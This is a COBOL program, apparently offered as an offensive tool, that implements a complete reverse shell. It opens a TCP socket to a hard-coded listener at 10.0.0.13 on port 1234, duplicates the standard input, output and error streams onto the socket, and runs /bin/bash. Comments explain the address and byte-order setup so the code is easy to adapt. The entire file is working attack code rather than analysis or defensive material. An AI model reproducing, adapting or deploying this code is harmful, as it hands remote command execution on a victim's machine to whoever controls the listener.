       IDENTIFICATION DIVISION.

       PROGRAM-ID.     Reverse_Shell.
       AUTHOR.         @HackVlix.
       DATE-WRITTEN.   December 2023.
      *************** 
       DATA DIVISION.
        
       WORKING-STORAGE SECTION.
      * Arguments for the socket call.
       01  PF_INET      PIC 9(8) USAGE BINARY VALUE 2.
       01  SOCK_STREAM  PIC 9(8) USAGE BINARY VALUE 1.
       01  IPPROTO_IP   PIC 9(8) USAGE BINARY VALUE 0.
       01  socket-descriptor PIC 9(8) USAGE BINARY.

      * Arguments for the connect call.
      * Note that port and ip address must be supplied in Big Endian.     
      * We have arguments
      *    sin_len = 0x00, sin_family = 0x02
      *    IP address = 10.0.0.13 (hex 0x0A00000D, decimal 167772173)
      *    port = 1234 (hex 0x04D2).
      * Normally, we would have to convert these numbers to Big Endian,
      * but IBM COBOL already stores these VALUEs as Big Endian,
      * so we do not need to do this ourselves.
       01  listener-address.
           02  sin_len      PIC X(1) VALUE x'00'.
           02  sin_family   PIC X(1) VALUE x'02'.
           02  sin_port     PIC 9(4) USAGE BINARY VALUE 1234.
           02  sin_addr     PIC 9(8) USAGE BINARY VALUE 167772173.
           02  sin_zero     PIC X(8) VALUE LOW-VALUES.
       01  address-len  PIC 9(8) USAGE BINARY VALUE 16.

      * Standard file descriptors on Unixoid systems.                                      
       01  STDIN   PIC 9(8) USAGE BINARY VALUE 0.
       01  STDOUT  PIC 9(8) USAGE BINARY VALUE 1.
       01  STDERR  PIC 9(8) USAGE BINARY VALUE 2.

      * Argument for execve as a C-string (null-terminated).
       01  path-string.
           02  path PIC X(9) VALUE "/bin/bash".
           02  end-C-string PIC X(1) VALUE x'00'.
      ********************
       PROCEDURE DIVISION.

      *    DISPLAY "[+] Creating socket: ".
      *    DISPLAY "   domain   = " PF_INET.
      *    DISPLAY "   type     = " SOCK_STREAM.
      *    DISPLAY "   protocol = " IPPROTO_IP.
           CALL "socket" USING
               BY VALUE PF_INET
               BY VALUE SOCK_STREAM                                       
               BY VALUE IPPROTO_IP
               RETURNING socket-descriptor.
      *    DISPLAY "[DEBUG] Socket descriptor = " socket-descriptor.

           DISPLAY "[+] Connecting: ".
           DISPLAY "   port    = " sin_port IN listener-address.
           DISPLAY "   address = " sin_addr IN listener-address.
           CALL "connect" USING
               BY VALUE socket-descriptor
               BY REFERENCE listener-address
               BY VALUE address-len
               RETURNING RETURN-CODE.
      *    DISPLAY "[DEBUG] connection status = " return-code.                      

      * On Linux, use dup3 instead of dup2.
           CALL "dup2" USING
               BY VALUE socket-descriptor
               BY VALUE STDIN
               RETURNING RETURN-CODE.
           CALL "dup2" USING
               BY VALUE socket-descriptor
               BY VALUE STDOUT
               RETURNING RETURN-CODE.
           CALL "dup2" USING
               BY VALUE socket-descriptor
               BY VALUE STDERR
               RETURNING RETURN-CODE.

           DISPLAY "[+] Running shell " path IN path-string
               " on target: IP " sin_addr IN listener-address
               " : Port " sin_port IN listener-address.
           CALL "execve" USING
               BY REFERENCE path-string
               BY VALUE 0
               BY VALUE 0
               RETURNING RETURN-CODE.

           STOP RUN.
